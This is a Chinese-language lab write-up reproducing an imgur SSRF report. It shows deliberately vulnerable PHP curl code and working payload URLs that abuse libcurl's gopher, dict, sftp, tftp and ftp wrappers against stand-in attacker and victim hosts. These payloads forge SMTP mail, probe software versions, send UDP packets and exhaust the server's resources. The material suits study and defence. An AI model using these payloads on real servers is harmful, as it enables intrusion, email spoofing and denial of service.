# SSRF libcurl protocol wrappers利用分析

0x00 概述
-------

* * *

前几天在[hackerone](https://hackerone.com/)上看到一个[imgur](http://imgur.com/)的[SSRF漏洞](https://hackerone.com/reports/115748)，url为：`https://imgur.com/vidgif/url?url=xxx`，参数url没有做限制，可以访问内网地址。请求过程中使用到了liburl库，并且liburl配置不当，可以让攻击者使用除http(s)之外的多个libcurl protocol wrappers，比如`ftp://xxx.com/file`会让服务器发起ftp请求。

漏洞提交者[aesteral](https://hackerone.com/aesteral)在报告中给出了几种协议的利用方法，查了下drops之前SSRF文章，好像没有专门介绍protocol wrappers，刚好看到了这个漏洞报告，就尝试着搭建环境复现下，记录下过程。

0x01 环境搭建
---------

* * *

首先要搭建php + nginx环境，来模拟SSRF server端漏洞环境，这里选择用[docker](http://www.docker.com/)来搭建，系统为Ubuntu14.04，docker安装可以参考[文档](https://docs.docker.com/linux/step_one/)，ubuntu的apt源建议换成[国内的](http://wiki.ubuntu.org.cn/Template:14.04source)，安装起来比较快。

安装完后，拉取docker hub上安装好php + nginx环境的image，仓库在国外，速度可能略慢

`docker pull richarvey/nginx-php-fpm`

创建代码目录`/app`

启动container(映射端口、挂载volume):

`sudo docker run --name nginx -p 8084:80 -v /app:/usr/share/nginx/html -d richarvey/nginx-php-fpm`

在/app目录下创建ssrf.php，代码中使用curl请求参数url对应的资源，返回给客户端，用于模拟SSRF的功能

```
<?php
        $url = $_GET['url'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.1 Safari/537.11');
        // 允许302跳转
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $res = curl_exec($ch);
        // 设置content-type
        header('Content-Type: image/png');
        curl_close($ch) ;
        //返回响应
        echo $res;
?>

```

我们测试加载图片，访问

`http://victim:8084/ssrf.php?url=http://download.easyicon.net/png/1199986/96/`

[![](http://static.wooyun.org//drops/20160318/2016031808183819379.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/03/75B3CE55-D9FA-4F05-9B81-AE3385E9676A.jpg)

测试SSRF，在另一台机器上执行`nc -l -v 11111`，监听11111端口

访问`http://victim:8084/ssrf.php?url=http://attacker:11111/`

[![](http://static.wooyun.org//drops/20160318/2016031808183850391.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/03/D2479565-6067-49CF-B12B-E4EF2D77BCA3.jpg)

0x02 可利用的协议
-----------

* * *

**报告里给出的可利用的协议有**

*   SSH (scp://, sftp://)
*   POP3
*   IMAP
*   SMTP
*   FTP
*   DICT
*   GOPHER
*   TFTP

我们来看一下Ubuntu14.04下默认的libcurl支持哪些协议

因为docker ubuntu image没有curl，所以安装`apt-get install -y curl`

然后执行`curl -V`

```
root@ubuntu:/app# curl -V
curl 7.35.0 (x86_64-pc-linux-gnu) libcurl/7.35.0 OpenSSL/1.0.1f zlib/1.2.8 libidn/1.28 librtmp/2.3
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smtp smtps telnet tftp
Features: AsynchDNS GSS-Negotiate IDN IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP

```

可以看到

```
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smtp smtps telnet tftp

```

中，并没有SSH(scp://, sftp://)，所以默认是不支持的SSH协议的，需要自己下载源码重现编译安装，可以参考[这篇文章](http://wiki.hetzner.de/index.php/Curl_fuer_sftp/en)。

0x03 利用方式
---------

* * *

**简单的利用，信息泄露**

利用SSH和DICT协议获取软件版本信息

sftp(需要curl编译安装libssh库)访问:`http://victim:8084/ssrf.php?url=sftp://attacker:11111/`

[![](http://static.wooyun.org//drops/20160318/2016031808183951780.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/03/F90A5E0B-F339-40F7-A8DC-140FBCF3505C.jpg)

DICT访问`http://victim:8084/ssrf.php?url=dict://attacker:11111/`[![](http://static.wooyun.org//drops/20160318/2016031808183981394.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/03/F83A4EAE-C755-46AF-8BAC-6384B740859A.jpg)

可以看到服务使用的软件版本，`libssh2 1.4.3`和`libcurl 7.35.0`。查看下CVE

`libssh2 1.4.3`可能受 CVE-2015-1782 影响

报告中imgur服务器中的软件版本是`libcurl 7.40.0`可能受 CVE-2015-3144 和 CVE-2015-3237影响，我们的版本为`libcurl 7.35.0`，不受影响

* * *

**利用GOPHER协议伪造发送邮件**

先介绍下GOPHER协议，来自百度知道～

`Gopher协议是一种互联网没有发展起来之前的一种从远程服务器上获取数据的协议。Gopher协议目前已经很少使用，它几乎已经完全被HTTP协议取代了。`

因为GOPHER协议支持newlines，所以可以用来发起类似TELNET chat-session的请求，比如SMTP，Redis server等。漏洞报告中提到imgur过滤了url参数中的newlines，但imgur server支持302跳转，所以可以构造一个302跳转的页面，结合GOPHER协议来完成攻击。

先测试一下GOPHER协议的效果，构造302跳转页面 gopher.php

```
<?php
header('Location: gopher://attacker:11111/_HI%0AMultiline%0Atest');
?>

```

访问`http://victim:8084/ssrf.php?url=http://attacker/gopher.php`

attacker端：

[![](http://static.wooyun.org//drops/20160318/2016031808183953884.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/03/9BF07BD2-D848-4609-9C57-0D08087BA647.jpg)

接下来是发送邮件，本来想用国内的邮箱试试的，然而都加了登陆验证来防止垃圾邮件。

报告中给了一个 http://test.smtp.org/ 的网站，可以用来测试，这里修改了收件人，不然不会发送成功

smtp.php:

```
<?php
        $commands = array(
                'HELO test.org',
                'MAIL FROM: <imgur@imgur.com>',
                'RCPT TO: postmaster@test.smtp.org',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://smtp.163.com:25/_'.$payload);
?>

```

访问`http://victim:8084/ssrf.php?url=http://attacker:8084/smtp.php`

可以到 http://test.smtp.org/log 下查看日志，我的VPS连接不了 http://test.smtp.org的25端口，换来一台直接用TELNET模拟

```
ubuntu@ubuntu:~$ telnet test.smtp.org 25
Trying 52.2.168.164...
Connected to test.smtp.org.
Escape character is '^]'.
220 test.smtp.org ESMTP Sendmail 8.16.0.16 ready at Fri, 18 Mar 2016 06:47:04 GMT; see http://test.smtp.org/
HELO test.org
250 test.smtp.org Hello [xx.xx.xx.xx], pleased to meet you
MAIL FROM: <imgur@imgur.com>
250 2.1.0 <imgur@imgur.com>... Sender ok
RCPT TO: postmaster@test.smtp.org
250 2.1.5 postmaster@test.smtp.org... Recipient ok
DATA
354 Enter mail, end with "." on a line by itself
Test mail
.
250 2.0.0 u2I6l4QU017644 Message accepted for delivery

```

日志

[![](http://static.wooyun.org//drops/20160318/2016031808184049375.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/03/4303DD91-97BC-41C2-8037-D9C3CB6384D5.jpg)

* * *

**使用TFTP协议来发送UDP包**

服务端监听UDP 11111端口`nc -v -u -l 11111`

访问`http://Victim:8084/ssrf.php?url=tftp://Attacker:11111/TEST`

Attacker:[![](http://static.wooyun.org//drops/20160318/2016031808184044868.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/03/5E2AC53D-B859-41A3-8093-2ADD2674EB0A.jpg)

可以用来向UDP服务发起请求，比如Memcache 和 REDIS-UDP

* * *

**Denial of service**

如果请求的超时时间较长，攻击者可以iptables的 TARPIT 来block请求，此外CURL的 FTP:// 永远不会超时

Attacker 监听`nc -v -l 11111`

访问`http://Victim:8084/ssrf.php?url=ftp://Attacker:11111/TEST`

nginx环境下默认超时时间为1分钟[![](http://static.wooyun.org//drops/20160318/2016031808184110257.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/03/C5A25D8D-1599-4E8B-83DB-EBCC7FB2051C.jpg)

攻击者可以发起大量请求来耗尽服务器的资源

0x04 结论
-------

* * *

撸站遇到SSRF时，除了可以使用http(s)之外，还有其它的一些协议，这里进行了简单的分析，希望对大家有一些帮助～